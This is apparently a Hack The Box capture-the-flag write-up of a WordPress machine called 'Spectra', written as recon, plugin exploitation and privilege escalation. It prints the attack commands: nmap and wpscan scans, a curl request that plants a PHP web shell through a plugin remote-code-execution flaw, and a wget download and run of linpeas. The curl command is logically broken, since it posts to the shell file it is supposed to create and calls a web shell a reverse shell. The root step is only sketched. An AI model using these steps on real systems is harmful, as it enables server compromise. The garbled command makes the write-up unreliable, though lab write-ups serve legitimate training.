#Hack The Box: "Spectra" Challenge Writeup
            #Objective:
The goal of this challenge was to gain access to a vulnerable web server running an outdated WordPress plugin and escalate privileges on the system.
###Step 1: Initial Reconnaissance

-Used nmap to scan the target IP for open ports.

'bash
'nmap -A -T4 <target_ip>'

        Discovered ports 80 (HTTP) and 22 (SSH) open.
        HTTP server revealed a WordPress site running on the target machine.

Step 2: Exploiting WordPress Plugin

    Identified an outdated plugin using a WordPress vulnerability scanner (wpscan):

'bash
'wpscan --url http://<target_ip> --enumerate p'

The vulnerable plugin allowed for remote code execution (RCE).

Used the discovered vulnerability to upload a reverse shell and execute it:

'bash
'curl -X POST -d "cmd=echo '<?php system($_GET['cmd']); ?>' > shell.php" http://<target_ip>/wp-content/plugins/vulnerable_plugin/shell.php?cmd=id

Step 3: Privilege Escalation

    After gaining a low-privilege shell, enumerated the system for potential escalation vectors using linpeas.

   ' bash
   ' wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   ' chmod +x linpeas.sh
   ' ./linpeas.sh

    Found a kernel vulnerability that allowed for local privilege escalation and exploited it to gain root access.

Lessons Learned:

   - Importance of regularly updating CMS platforms like WordPress.
   - Outdated plugins pose significant security risks, providing attackers with entry points.
